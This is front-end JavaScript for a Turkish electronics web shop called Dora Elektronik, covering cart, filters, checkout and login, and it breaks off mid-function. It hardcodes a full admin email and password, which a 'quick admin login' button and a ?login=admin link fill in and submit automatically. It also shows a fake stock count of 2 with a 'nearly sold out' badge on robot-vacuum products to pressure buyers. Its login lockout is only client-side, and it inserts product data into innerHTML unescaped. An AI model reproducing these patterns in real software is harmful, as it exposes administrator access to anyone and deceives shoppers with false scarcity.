// Main Logic Script - Dora Elektronik

// ── DORA Security Layer ──────────────────────────────────────────────────
// XSS Sanitization helper
function sanitizeInput(str) {
    if (typeof str !== 'string') return '';
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// Brute Force Protection State
const _loginAttempts = { count: 0, lockedUntil: 0 };

function isLoginLocked() {
    if (_loginAttempts.lockedUntil > Date.now()) {
        const secsLeft = Math.ceil((_loginAttempts.lockedUntil - Date.now()) / 1000);
        return secsLeft;
    }
    return 0;
}

function recordLoginFailure() {
    _loginAttempts.count++;
    if (_loginAttempts.count >= 5) {
        _loginAttempts.lockedUntil = Date.now() + 30000; // 30 saniye
        _loginAttempts.count = 0;
    }
}

function resetLoginAttempts() {
    _loginAttempts.count = 0;
    _loginAttempts.lockedUntil = 0;
}

// Rate Limiting (form submit)
const _submitTimestamps = {};
function isRateLimited(formId, limitMs = 2000) {
    const now = Date.now();
    if (_submitTimestamps[formId] && (now - _submitTimestamps[formId]) < limitMs) {
        return true;
    }
    _submitTimestamps[formId] = now;
    return false;
}
// ─────────────────────────────────────────────────────────────────────────

// State
let cart = [];
try {
    const rawCart = localStorage.getItem('dora_cart');
    if (rawCart) cart = JSON.parse(rawCart);
} catch (e) {
    cart = [];
}
let currentCategory = 'all';
let activeCoupon = null;

// DOM Elements
const productGrid = document.getElementById('product-grid');
const cartBtn = document.getElementById('cart-btn');
const closeCartBtn = document.getElementById('close-cart');
const cartSidebar = document.getElementById('cart-sidebar');
const cartOverlay = document.getElementById('cart-overlay');
const cartItemsContainer = document.getElementById('cart-items');
const cartCount = document.getElementById('cart-count');
const cartSubtotalPrice = document.getElementById('cart-subtotal-price');
const couponDiscountRow = document.getElementById('coupon-discount-row');
const cartDiscountPrice = document.getElementById('cart-discount-price');
const cartTotalPrice = document.getElementById('cart-total-price');
const checkoutBtn = document.getElementById('checkout-btn');

// Filters Drawer Elements
const filterToggleBtn = document.getElementById('filter-toggle-btn');
const closeFiltersBtn = document.getElementById('close-filters');
const filtersSidebar = document.querySelector('.filters-sidebar');
const filtersOverlay = document.getElementById('filters-overlay');

// Modals
const successModal = document.getElementById('success-modal');
const successOverlay = document.getElementById('success-overlay');
const closeSuccessBtn = document.getElementById('close-success');
const aboutModal = document.getElementById('about-modal');
const aboutOverlay = document.getElementById('about-overlay');
const closeAboutBtn = document.getElementById('close-about');
const contactModal = document.getElementById('contact-modal');
const contactOverlay = document.getElementById('contact-overlay');
const closeContactBtn = document.getElementById('close-contact');
const contactForm = document.getElementById('contact-form');
const footerAboutLink = document.getElementById('footer-about-link');
const footerContactLink = document.getElementById('footer-contact-link');

// Authentication Elements
const authArea = document.getElementById('auth-area');
const loginModal = document.getElementById('login-modal');
const loginOverlay = document.getElementById('login-overlay');
const closeLoginBtn = document.getElementById('close-login');
const loginForm = document.getElementById('login-form');
const loginErrorMsg = document.getElementById('login-error-msg');
const registerModal = document.getElementById('register-modal');
const registerOverlay = document.getElementById('register-overlay');
const closeRegisterBtn = document.getElementById('close-register');
const registerForm = document.getElementById('register-form');
const registerErrorMsg = document.getElementById('register-error-msg');
const goToRegisterLink = document.getElementById('go-to-register');
const goToLoginLink = document.getElementById('go-to-login');

// Checkout Modal Elements
const checkoutModal = document.getElementById('checkout-modal');
const checkoutOverlay = document.getElementById('checkout-overlay');
const closeCheckoutBtn = document.getElementById('close-checkout');
const deliveryForm = document.getElementById('delivery-form');
const checkoutStep1 = document.getElementById('checkout-step-1');
const checkoutStep2 = document.getElementById('checkout-step-2');
const backToStep1Btn = document.getElementById('back-to-step-1');
const confirmOrderBtn = document.getElementById('confirm-order-btn');
const summaryAddressDetails = document.getElementById('summary-address-details');
const summaryContactDetails = document.getElementById('summary-contact-details');
const successOrderCode = document.getElementById('success-order-code');

// 3D Secure Elements
const threeDSecureModal = document.getElementById('three-d-secure-modal');
const threeDOverlay = document.getElementById('three-d-overlay');
const threeDCodeDisplay = document.getElementById('three-d-code-display');
const threeDCodeInput = document.getElementById('three-d-code-input');
const threeDForm = document.getElementById('three-d-form');
const threeDErrorMsg = document.getElementById('three-d-error-msg');

let currentThreeDCode = '';
let pendingOrderData = null;

// Search and Coupon Elements
const searchInput = document.getElementById('search-input');
const couponInput = document.getElementById('coupon-input');
const applyCouponBtn = document.getElementById('apply-coupon-btn');
const couponMessage = document.getElementById('coupon-message');

// Filter state
let selectedBrands = [];
let selectedSizes = [];
let maxPrice = 120000;

// Initialize App
function init() {
    const urlParams = new URLSearchParams(window.location.search);
    const searchParam = urlParams.get('search');
    const checkoutParam = urlParams.get('checkout');
    
    // Setup UI & Events
    renderAuthNavbar();
    setupEventListeners();
    updateCart();
    setupCardInputFormatters();
    
    // Initialize Filters
    initFilters();

    // Load Products
    if (searchParam) {
        searchInput.value = searchParam;
    }
    renderProducts();

    // Check if redirected to checkout
    if (checkoutParam === 'true' && cart.length > 0) {
        openCheckoutModal();
    }

    // Check if redirected to FAQ
    const faqParam = urlParams.get('faq');
    if (faqParam === 'true') {
        if (window.openFaqModal) {
            window.openFaqModal();
        }
    }

    // Check hash for category synchronization
    const hash = window.location.hash.replace('#', '');
    if (hash && ['guzellik', 'temizlik', 'mutfak', 'kahve'].includes(hash)) {
        setCategory(hash);
        setTimeout(() => {
            const productsEl = document.getElementById('products');
            if (productsEl) productsEl.scrollIntoView({ behavior: 'smooth' });
        }, 300);
    }

    // Check if redirected to login modal (specifically for admin redirect)
    const loginParam = urlParams.get('login');
    if (loginParam === 'admin') {
        openLoginModal();
        const helperBox = document.getElementById('login-helper-box');
        if (helperBox) {
            helperBox.style.display = 'block';
        }
        const quickBtn = document.getElementById('quick-admin-login-btn');
        if (quickBtn) {
            quickBtn.onclick = () => {
                document.getElementById('login-email').value = 'admin@doraelektronik.com';
                document.getElementById('login-password').value = 'DoraElektronik@Admin2026!Secure';
                const submitBtn = loginForm.querySelector('button[type="submit"]');
                if (submitBtn) submitBtn.click();
            };
        }
    }
}

// Populate and setup filters
function initFilters() {
    const products = db.getProducts();
    
    // 1. Unique Brands
    const brands = [...new Set(products.map(p => p.brand))].sort();
    const brandsContainer = document.getElementById('filter-brands-list');
    if (brandsContainer) {
        brandsContainer.innerHTML = brands.map(brand => `
            <label class="checkbox-label">
                <input type="checkbox" class="brand-filter-checkbox" value="${brand.toLowerCase()}">
                <span>${brand}</span>
            </label>
        `).join('');
    }

    // 2. Unique Sizes
    const sizes = [];
    products.forEach(p => {
        p.sizes.forEach(s => {
            if (!sizes.includes(s)) sizes.push(s);
        });
    });
    sizes.sort();
    const sizesContainer = document.getElementById('filter-sizes-list');
    if (sizesContainer) {
        sizesContainer.innerHTML = sizes.map(size => `
            <label class="checkbox-label">
                <input type="checkbox" class="size-filter-checkbox" value="${size.toLowerCase()}">
                <span>${size}</span>
            </label>
        `).join('');
    }

    // 3. Slider events
    const priceSlider = document.getElementById('filter-price');
    const priceDisplay = document.getElementById('filter-price-display');
    if (priceSlider && priceDisplay) {
        priceSlider.addEventListener('input', (e) => {
            maxPrice = parseInt(e.target.value);
            priceDisplay.innerText = `${maxPrice} TL`;
            renderProducts();
        });
    }

    // 4. Checkbox events
    document.querySelectorAll('.brand-filter-checkbox').forEach(cb => {
        cb.addEventListener('change', () => {
            selectedBrands = Array.from(document.querySelectorAll('.brand-filter-checkbox:checked')).map(el => el.value);
            renderProducts();
        });
    });

    document.querySelectorAll('.size-filter-checkbox').forEach(cb => {
        cb.addEventListener('change', () => {
            selectedSizes = Array.from(document.querySelectorAll('.size-filter-checkbox:checked')).map(el => el.value);
            renderProducts();
        });
    });

    // 5. Reset button
    const resetBtn = document.getElementById('reset-filters-btn');
    if (resetBtn) {
        resetBtn.addEventListener('click', () => {
            if (priceSlider && priceDisplay) {
                priceSlider.value = 120000;
                maxPrice = 120000;
                priceDisplay.innerText = '120000 TL';
            }
            document.querySelectorAll('.brand-filter-checkbox:checked').forEach(cb => cb.checked = false);
            document.querySelectorAll('.size-filter-checkbox:checked').forEach(cb => cb.checked = false);
            selectedBrands = [];
            selectedSizes = [];
            renderProducts();
        });
    }
}

// Unified Category Filter & View State Handler
function setCategory(category) {
    currentCategory = category;
    
    const categoryNames = {
        guzellik: 'Güzellik & Saç Şekillendirme',
        temizlik: 'Akıllı Temizlik & Süpürgeler',
        mutfak: 'Premium Mutfak Aletleri',
        kahve: 'Lüks Kahve Makineleri'
    };
    
    const headerTitle = document.querySelector('.section-header h3');
    const headerSub = document.querySelector('.section-header p');
    
    if (headerTitle && headerSub) {
        if (category === 'all') {
            headerTitle.innerText = 'Yeni Gelenler';
            headerSub.innerText = 'Sizin için seçtiğimiz en özel parçalar';
        } else {
            const displayName = categoryNames[category] || (category.charAt(0).toUpperCase() + category.slice(1));
            headerTitle.innerText = displayName + ' Kategorisi';
            headerSub.innerText = 'Seçtiğiniz kategoriye özel indirimli ürünler';
        }
    }
    
    if (searchInput) searchInput.value = '';
    
    // Reset filters
    const priceSlider = document.getElementById('filter-price');
    const priceDisplay = document.getElementById('filter-price-display');
    if (priceSlider && priceDisplay) {
        priceSlider.value = 120000;
        maxPrice = 120000;
        priceDisplay.innerText = '120000 TL';
    }
    document.querySelectorAll('.brand-filter-checkbox:checked').forEach(cb => cb.checked = false);
    document.querySelectorAll('.size-filter-checkbox:checked').forEach(cb => cb.checked = false);
    selectedBrands = [];
    selectedSizes = [];

    renderProducts();
}
window.setCategory = setCategory;

// Render Products from local DB
function renderProducts() {
    productGrid.innerHTML = '';
    const products = db.getProducts();
    const searchQuery = searchInput ? searchInput.value.trim() : '';
    
    let filteredProducts = products;

    // 1. Category Filter
    if (currentCategory !== 'all') {
        filteredProducts = filteredProducts.filter(p => p.category === currentCategory);
    }

    // 2. Search Query Filter
    if (searchQuery !== '') {
        const query = searchQuery.toLocaleLowerCase('tr-TR');
        filteredProducts = filteredProducts.filter(p => 
            p.title.toLocaleLowerCase('tr-TR').includes(query) || 
            p.brand.toLocaleLowerCase('tr-TR').includes(query) || 
            p.category.toLocaleLowerCase('tr-TR').includes(query) ||
            (p.description && p.description.toLocaleLowerCase('tr-TR').includes(query))
        );
    }

    // 3. Price Filter
    filteredProducts = filteredProducts.filter(p => p.newPrice <= maxPrice);

    // 4. Brands Filter
    if (selectedBrands.length > 0) {
        filteredProducts = filteredProducts.filter(p => selectedBrands.includes(p.brand.toLowerCase()));
    }

    // 5. Sizes/Colors Filter
    if (selectedSizes.length > 0) {
        filteredProducts = filteredProducts.filter(p => 
            p.sizes.some(s => selectedSizes.includes(s.toLowerCase()))
        );
    }

    if (filteredProducts.length === 0) {
        const allProducts = db.getProducts();
        // Get 3 random recommendations
        const recommendations = [...allProducts].sort(() => 0.5 - Math.random()).slice(0, 3);
        
        let recHtml = '';
        recommendations.forEach(product => {
            const discountPercent = Math.round(((product.oldPrice - product.newPrice) / product.oldPrice) * 100);
            const isRobot = product.title.toLowerCase().includes('robot') || (product.category === 'temizlik' && product.brand.toLowerCase() === 'roborock');
            const displayStock = isRobot ? 2 : product.stock;

            const stockBadgeHtml = displayStock <= 3 
                ? `<div class="stock-badge badge-warning">Tükenmek Üzere (Son ${displayStock} Ürün)</div>`
                : `<div class="stock-badge badge-info">Stok: ${displayStock} Adet</div>`;
                
            recHtml += `
                <div class="product-card" style="position: relative;">
                    <a href="product.html?id=${product.id}">
                        <div class="product-img">
                            ${stockBadgeHtml}
                            <span class="discount-badge">%${discountPercent} İndirim</span>
                            <img src="${product.image}" alt="${product.title}" loading="lazy">
                        </div>
                    </a>
                    <div class="product-info">
                        <div class="product-category">${product.category.toUpperCase()}</div>
                        <h4 class="product-title">
                            <a href="product.html?id=${product.id}" style="color: inherit;">${product.title}</a>
                        </h4>
                        <div class="product-prices">
                            <span class="old-price">${product.oldPrice.toLocaleString('tr-TR')} TL</span>
                            <span class="new-price">${product.newPrice.toLocaleString('tr-TR')} TL</span>
                        </div>
                        <button class="btn btn-primary w-100 add-to-cart" data-id="${product.id}" ${product.stock === 0 ? 'disabled style="opacity: 0.5;"' : ''}>
                            ${product.stock === 0 ? 'Tükendi' : 'Sepete Ekle'}
                        </button>
                    </div>
                </div>
            `;
        });

        productGrid.innerHTML = `
            <div style="grid-column: 1 / -1; text-align: center; padding: 40px 20px; color: var(--gray);">
                <i class="fa-solid fa-magnifying-glass" style="font-size: 3rem; color: var(--border); margin-bottom: 15px; display: block;"></i>
                <p style="font-size: 1.1rem; font-weight: 500; margin-bottom: 10px; color: var(--dark);">Aradığınız kriterlere uygun ürün bulunamadı.</p>
                <p style="font-size: 0.9rem; margin-bottom: 40px;">Farklı arama terimleri kullanabilir veya filtreleri temizleyebilirsiniz.</p>
                
                <h3 style="color: var(--dark); font-size: 1.4rem; margin-bottom: 25px; border-top: 1px solid var(--border); padding-top: 40px;">Sizin İçin Seçtiğimiz Diğer Ürünler</h3>
                <div class="grid" style="text-align: left;">
                    ${recHtml}
                </div>
            </div>
        `;
        
        // Bind event listeners for recommendation cards
        document.querySelectorAll('.add-to-cart').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const id = parseInt(e.currentTarget.dataset.id);
                const prod = allProducts.find(p => p.id === id);
                const defaultSize = prod.sizes ? prod.sizes[0] : 'Standart';
                addToCart(id, defaultSize, 1, e.currentTarget);
            });
        });
        return;
    }

    filteredProducts.forEach(product => {
        const discountPercent = Math.round(((product.oldPrice - product.newPrice) / product.oldPrice) * 100);
        
        const isRobot = product.title.toLowerCase().includes('robot') || (product.category === 'temizlik' && product.brand.toLowerCase() === 'roborock');
        const displayStock = isRobot ? 2 : product.stock;

        const stockBadgeHtml = displayStock <= 3 
            ? `<div class="stock-badge badge-warning" style="animation: pulse 2s infinite;">🔥 Tükenmek Üzere (Son ${displayStock})</div>`
            : `<div class="stock-badge badge-info">Stok: ${displayStock} Adet</div>`;

        const card = document.createElement('div');
        card.className = 'product-card';
        card.style.position = 'relative';
        card.innerHTML = `
            <a href="product.html?id=${product.id}">
                <div class="product-img">
                    ${stockBadgeHtml}
                    <span class="discount-badge">%${discountPercent} İndirim</span>
                    <img src="${product.image}" alt="${product.title}" loading="lazy">
                </div>
            </a>
            <div class="product-info">
                <div class="product-category">${product.category.toUpperCase()}</div>
                <h4 class="product-title">
                    <a href="product.html?id=${product.id}" style="color: inherit;">${product.title}</a>
                </h4>
                <div class="product-prices">
                    <span class="old-price">${product.oldPrice.toLocaleString('tr-TR')} TL</span>
                    <span class="new-price">${product.newPrice.toLocaleString('tr-TR')} TL</span>
                </div>
                <button class="btn btn-primary w-100 add-to-cart" data-id="${product.id}" ${product.stock === 0 ? 'disabled style="opacity: 0.5;"' : ''}>
                    ${product.stock === 0 ? 'Tükendi' : 'Sepete Ekle'}
                </button>
            </div>
        `;
        productGrid.appendChild(card);
    });

    // Add to cart listeners
    document.querySelectorAll('.add-to-cart').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const id = parseInt(e.currentTarget.dataset.id);
            const prod = products.find(p => p.id === id);
            const defaultSize = prod.sizes ? prod.sizes[0] : 'Standart';
            addToCart(id, defaultSize, 1, e.currentTarget);
        });
    });
}

// Render Authentication Navbar view
function renderAuthNavbar() {
    authArea.innerHTML = '';
    const user = db.getCurrentUser();

    if (user) {
        const wrapper = document.createElement('div');
        wrapper.style.display = 'flex';
        wrapper.style.alignItems = 'center';
        wrapper.style.gap = '10px';
        wrapper.innerHTML = `
            <span style="font-size:0.85rem; font-weight: 500; color:var(--dark); cursor:pointer;" onclick="window.location.href='profile.html'">
                <i class="fa-regular fa-circle-user" style="margin-right:4px;"></i> ${user.name}
            </span>
            ${user.role === 'admin' ? `
                <a href="admin.html" class="btn btn-secondary" style="padding: 6px 12px; font-size: 0.75rem; border-radius: 20px; border-color: var(--primary); color: var(--primary);">Panel</a>
            ` : ''}
            <button id="logout-nav-btn" class="icon-btn" style="font-size: 1rem; color: #ff4757;" title="Çıkış Yap">
                <i class="fa-solid fa-arrow-right-from-bracket"></i>
            </button>
        `;
        authArea.appendChild(wrapper);

        document.getElementById('logout-nav-btn').addEventListener('click', () => {
            db.logout();
            renderAuthNavbar();
            showToast('Başarıyla çıkış yapıldı.');
        });
    } else {
        const loginBtn = document.createElement('button');
        loginBtn.id = 'login-nav-btn';
        loginBtn.className = 'btn btn-secondary';
        loginBtn.style.padding = '6px 14px';
        loginBtn.style.fontSize = '0.85rem';
        loginBtn.style.borderRadius = '20px';
        loginBtn.innerText = 'Giriş Yap';
        loginBtn.addEventListener('click', openLoginModal);
        authArea.appendChild(loginBtn);
    }
}

// Cart Management
function addToCart(id, size = 'Standart', quantity = 1, btnElement = null) {
    const products = db.getProducts();
    const product = products.find(p => p.id === id);
    if (!product) return;
    
    const existingItem = cart.find(item => item.id === id && item.size === size);

    if (existingItem) {
        if (existingItem.quantity + quantity > product.stock) {
            showToast(`Üzgünüz, bu ürünün stok sınırına ulaşıldı (${product.stock} adet).`);
            return;
        }
        existingItem.quantity += quantity;
    } else {
        if (quantity > product.stock) {
            showToast(`Üzgünüz, bu ürünün stok sınırına ulaşıldı (${product.stock} adet).`);
            return;
        }
        cart.push({ ...product, size: size, quantity: quantity });
    }

    updateCart();
    
    // Bounce navbar cart button
    const cartBtn = document.getElementById('cart-btn');
    if (cartBtn) {
        cartBtn.classList.remove('cart-bounce');
        void cartBtn.offsetWidth; // Trigger reflow to restart animation
        cartBtn.classList.add('cart-bounce');
    }

    // Animate button if provided
    if (btnElement) {
        const originalHTML = btnElement.innerHTML;
        btnElement.classList.add('btn-added');
        btnElement.innerHTML = '<i class="fa-solid fa-check"></i> Eklendi';
        btnElement.disabled = true;
        setTimeout(() => {
            btnElement.classList.remove('btn-added');
            btnElement.innerHTML = originalHTML;
            btnElement.disabled = false;
        }, 1200);
    }

    // Show premium toast
    showProductAddedToast(product, size, quantity);
}

function removeFromCart(id, size) {
    cart = cart.filter(item => !(item.id === id && item.size === size));
    updateCart();
}

function updateCart() {
    try { localStorage.setItem('dora_cart', JSON.stringify(cart)); } catch(e) { /* storage full */ }
    const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
    cartCount.innerText = totalItems;

    if (cart.length === 0) {
        cartItemsContainer.innerHTML = `
            <div class="empty-cart-state">
                <i class="fa-solid fa-bag-shopping" style="font-size: 3.5rem; color: var(--border); margin-bottom: 15px; display: block;"></i>
                <p>Sepetiniz şu anda boş.</p>
                <button onclick="window.closeCart();" class="btn btn-secondary" style="font-size: 0.85rem; padding: 8px 20px; border-radius: 20px;">Alışverişe Başla</button>
            </div>
        `;
        checkoutBtn.disabled = true;
        checkoutBtn.style.opacity = '0.5';
    } else {
        checkoutBtn.disabled = false;
        checkoutBtn.style.opacity = '1';
        cartItemsContainer.innerHTML = '';
        
        cart.forEach(item => {
            const products = db.getProducts();
            const prod = products.find(p => p.id === item.id);
            const maxStock = prod ? prod.stock : 999;
            const isMaxStock = item.quantity >= maxStock;

            const minusIcon = item.quantity === 1 
                ? '<i class="fa-regular fa-trash-can" style="color: #ff4757;"></i>' 
                : '<i class="fa-solid fa-minus"></i>';
                
            const plusDisabled = isMaxStock 
                ? 'disabled style="opacity: 0.3; cursor: not-allowed;"' 
                : '';

            const el = document.createElement('div');
            el.className = 'cart-item';
            el.style.display = 'flex';
            el.style.gap = '15px';
            el.style.alignItems = 'center';
            el.style.marginBottom = '1.5rem';
            el.style.paddingBottom = '1.5rem';
            el.style.borderBottom = '1px solid var(--border)';
            el.innerHTML = `
                <img src="${item.image}" alt="${item.title}" loading="lazy" style="width: 70px; height: 70px; object-fit: cover; border-radius: 4px;">
                <div class="cart-item-info" style="flex: 1;">
                    <h4 class="cart-item-title" style="font-size: 0.9rem; margin-bottom: 3px; font-weight: 500; text-align: left;">${item.title}</h4>
                    <div style="font-size:0.75rem; color:var(--gray); margin-bottom: 6px; text-align: left;">Seçim: ${item.size}</div>
                    <div class="cart-item-price" style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-weight: 600; color: var(--primary); font-size: 0.95rem;">${(item.newPrice * item.quantity).toLocaleString('tr-TR')} TL</span>
                        <div class="cart-qty-selector" style="display: flex; align-items: center; border: 1px solid var(--border); border-radius: 4px; overflow: hidden; background: #fff; height: 26px;">
                            <button class="cart-qty-btn decrease-qty" data-id="${item.id}" data-size="${item.size}" style="width: 22px; height: 100%; border: none; background: none; cursor: pointer; font-size: 0.75rem; color: var(--dark); display: flex; align-items: center; justify-content: center;">${minusIcon}</button>
                            <span style="width: 26px; text-align: center; font-size: 0.8rem; font-weight: 600; line-height: 26px; border-left: 1px solid var(--border); border-right: 1px solid var(--border);">${item.quantity}</span>
                            <button class="cart-qty-btn increase-qty" data-id="${item.id}" data-size="${item.size}" ${plusDisabled} style="width: 22px; height: 100%; border: none; background: none; cursor: pointer; font-size: 0.75rem; color: var(--dark); display: flex; align-items: center; justify-content: center;"><i class="fa-solid fa-plus"></i></button>
                        </div>
                    </div>
                </div>
                <button class="remove-item" data-id="${item.id}" data-size="${item.size}" style="background: none; border: none; color: #ff4757; cursor: pointer; font-size: 1rem; padding: 5px; display: flex; align-items: center;" title="Kaldır">
                    <i class="fa-regular fa-trash-can"></i>
                </button>
            `;
            cartItemsContainer.appendChild(el);
        });

        // Decrease quantity listener
        document.querySelectorAll('.decrease-qty').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const id = parseInt(btn.dataset.id);
                const size = btn.dataset.size;
                const item = cart.find(i => i.id === id && i.size === size);
                if (item) {
                    if (item.quantity > 1) {
                        item.quantity -= 1;
                        updateCart();
                    } else {
                        removeFromCart(id, size);
                    }
                }
            });
        });

        // Increase quantity listener
        document.querySelectorAll('.increase-qty').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const id = parseInt(btn.dataset.id);
                const size = btn.dataset.size;
                const item = cart.find(i => i.id === id && i.size === size);
                if (item) {
                    const products = db.getProducts();
                    const prod = products.find(p => p.id === id);
                    if (prod && item.quantity < prod.stock) {
                        item.quantity += 1;
                        updateCart();
                    } else {
                        showToast(`Üzgünüz, bu ürünün stok sınırına ulaşıldı.`);
                    }
                }
            });
        });

        // Remove item listener
        document.querySelectorAll('.remove-item').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const id = parseInt(btn.currentTarget.dataset.id);
                const size = btn.currentTarget.dataset.size;
                removeFromCart(id, size);
            });
        });
    }

    // Calculations
    const subtotal = cart.reduce((sum, item) => sum + (item.newPrice * item.quantity), 0);
    cartSubtotalPrice.innerText = `${subtotal.toLocaleString('tr-TR')} TL`;

    let discount = 0;
    if (activeCoupon) {
        discount = subtotal * (activeCoupon.discountPercent / 100);
        couponDiscountRow.classList.remove('hidden');
        cartDiscountPrice.innerText = `-${discount.toLocaleString('tr-TR')} TL`;
    } else {
        couponDiscountRow.classList.add('hidden');
    }

    const total = subtotal - discount;
    cartTotalPrice.innerText = `${total.toLocaleString('tr-TR')} TL`;
}

// Modal Actions
function openCart() {
    cartSidebar.classList.add('open');
    cartOverlay.classList.add('active');
}

function closeCart() {
    cartSidebar.classList.remove('open');
    cartOverlay.classList.remove('active');
}

window.openCart = openCart;
window.closeCart = closeCart;

function openFilters() {
    if (filtersSidebar && filtersOverlay) {
        filtersSidebar.classList.add('open');
        filtersOverlay.classList.add('active');
    }
}

function closeFilters() {
    if (filtersSidebar && filtersOverlay) {
        filtersSidebar.classList.remove('open');
        filtersOverlay.classList.remove('active');
    }
}

window.openFilters = openFilters;
window.closeFilters = closeFilters;

function openCheckoutModal() {
    closeCart();
    
    // Auto fill if logged in
    const user = db.getCurrentUser();
    if (user) {
        document.getElementById('checkout-name').value = user.name;
        document.getElementById('checkout-email').value = user.email;
        document.getElementById('checkout-phone').value = user.phone || '';
        document.getElementById('checkout-address').value = user.address || '';
    } else {
        deliveryForm.reset();
    }

    checkoutStep1.classList.remove('hidden');
    checkoutStep2.classList.add('hidden');
    
    checkoutModal.classList.add('active');
    checkoutOverlay.classList.add('active');
}

function closeCheckoutModal() {
    checkoutModal.classList.remove('active');
    checkoutOverlay.classList.remove('active');
}

// Login/Register Modals
function openLoginModal() {
    loginErrorMsg.style.display = 'none';
    loginForm.reset();
    loginModal.classList.add('active');
    loginOverlay.classList.add('active');
}

function closeLoginModal() {
    loginModal.classList.remove('active');
    loginOverlay.classList.remove('active');
}

function openRegisterModal() {
    registerErrorMsg.style.display = 'none';
    registerForm.reset();
    registerModal.classList.add('active');
    registerOverlay.classList.add('active');
}

function closeRegisterModal() {
    registerModal.classList.remove('active');
    registerOverlay.classList.remove('active');
}

// Toast Notifications
function showToast(msg) {
    const toast = document.getElementById('toast-notification');
    toast.className = 'toast';
    toast.innerHTML = `
        <i class="fa-solid fa-circle-check toast-icon"></i>
        <span id="toast-message">${msg}</span>
    `;
    const toastMsg = document.getElementById('toast-message');
    toastMsg.innerText = msg;
    toast.classList.remove('hidden');
    
    if (window.toastTimeout) clearTimeout(window.toastTimeout);
    if (window.toastHideTimeout) clearTimeout(window.toastHideTimeout);
    
    setTimeout(() => {
        toast.classList.add('show');
    }, 50);
    
    window.toastTimeout = setTimeout(() => {
        toast.classList.remove('show');
        window.toastHideTimeout = setTimeout(() => {
            toast.classList.add('hidden');
            toast.className = 'toast hidden';
        }, 400);
    }, 3000);
}

function showProductAddedToast(product, size, quantity) {
    const toast = document.getElementById('toast-notification');
    toast.className = 'toast premium-toast';
    
    toast.innerHTML = `
        <div style="display: flex; gap: 15px; align-items: center; width: 100%;">
            <img src="${product.image}" alt="${product.title}" loading="lazy" style="width: 55px; height: 55px; object-fit: cover; border-radius: 4px; border: 1px solid var(--border);">
            <div style="flex: 1; text-align: left;">
                <div style="font-size: 0.8rem; color: var(--primary); font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Sepete Eklendi!</div>
                <div style="font-size: 0.9rem; font-weight: 500; color: #fff; margin-bottom: 2px; line-height: 1.2;">${product.brand} - ${product.title}</div>
                <div style="font-size: 0.75rem; color: #aaa;">Seçim: ${size} | Adet: ${quantity}</div>
            </div>
            <button onclick="window.openCart();" style="background: var(--primary); border: none; color: #1a1a1a; padding: 8px 14px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; cursor: pointer; transition: all 0.2s; white-space: nowrap;">Sepeti Gör</button>
        </div>
    `;
    
    toast.classList.remove('hidden');
    
    if (window.toastTimeout) clearTimeout(window.toastTimeout);
    if (window.toastHideTimeout) clearTimeout(window.toastHideTimeout);
    
    setTimeout(() => {
        toast.classList.add('show');
    }, 50);
    
    window.toastTimeout = setTimeout(() => {
        toast.classList.remove('show');
        window.toastHideTimeout = setTimeout(() => {
            toast.classList.add('hidden');
            toast.className = 'toast hidden';
        }, 400);
    }, 3500);
}

// Event Listeners Setup
function setupEventListeners() {
    cartBtn.addEventListener('click', openCart);
    closeCartBtn.addEventListener('click', closeCart);
    cartOverlay.addEventListener('click', closeCart);
    
    // Filters Drawer Event Listeners
    if (filterToggleBtn) filterToggleBtn.addEventListener('click', openFilters);
    if (closeFiltersBtn) closeFiltersBtn.addEventListener('click', closeFilters);
    if (filtersOverlay) filtersOverlay.addEventListener('click', closeFilters);
    
    checkoutBtn.addEventListener('click', () => {
        if (cart.length > 0) {
            openCheckoutModal();
        }
    });

    closeCheckoutBtn.addEventListener('click', closeCheckoutModal);
    checkoutOverlay.addEventListener('click', closeCheckoutModal);

    // Auth Modal close handlers
    closeLoginBtn.addEventListener('click', closeLoginModal);
    loginOverlay.addEventListener('click', closeLoginModal);
    closeRegisterBtn.addEventListener('click', closeRegisterModal);
    registerOverlay.addEventListener('click', closeRegisterModal);

    // Switcher links
    goToRegisterLink.addEventListener('click', (e) => {
        e.preventDefault();
        closeLoginModal();
        openRegisterModal();
    });

    goToLoginLink.addEventListener('click', (e) => {
        e.preventDefault();
        closeRegisterModal();
        openLoginModal();
    });

    // Toggle admin helper box
    const toggleAdminInfo = document.getElementById('toggle-admin-info');
    if (toggleAdminInfo) {
        toggleAdminInfo.addEventListener('click', (e) => {
            e.preventDefault();
            const helperBox = document.getElementById('login-helper-box');
            if (helperBox) {
                if (helperBox.style.display === 'none' || helperBox.style.display === '') {
                    helperBox.style.display = 'block';
                } else {
                    helperBox.style.display = 'none';
                }
            }
        });
    }

    // Quick admin login click
    const quickAdminBtn = document.getElementById('quick-admin-login-btn');
    if (quickAdminBtn) {
        quickAdminBtn.addEventListener('click', () => {
            const emailInput = document.getElementById('login-email');
            const passInput = document.getElementById('login-password');
            if (emailInput && passInput) {
                emailInput.value = 'admin@doraelektronik.com';
                passInput.value = 'DoraElektronik@Admin2026!Secure';
                const submitBtn = loginForm.querySelector('button[type="submit"]');
                if (submitBtn) submitBtn.click();
            }
        });
    }

    // Login submit (Brute Force korumalı)
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Rate limiting
        if (isRateLimited('loginForm', 1500)) return;

        // Brute force lock check
        const lockSecs = isLoginLocked();
        if (lockSecs > 0) {
            loginErrorMsg.textContent = `Çok fazla başarısız deneme. Lütfen ${lockSecs} saniye bekleyin.`;
            loginErrorMsg.style.display = 'block';
            return;
        }

        const email = document.getElementById('login-email').value;
        const pass = document.getElementById('login-password').value;

        // Basic input validation
        if (!email || !email.includes('@') || !pass) {
            loginErrorMsg.textContent = 'Lütfen geçerli e-posta ve şifre giriniz.';
            loginErrorMsg.style.display = 'block';
            return;
        }

        try {
            await db.login(email, pass);
            resetLoginAttempts();
            closeLoginModal();
            renderAuthNavbar();
            showToast('Giriş başarılı!');
        } catch (err) {
            recordLoginFailure();
            const lockSecsNow = isLoginLocked();
            if (lockSecsNow > 0) {
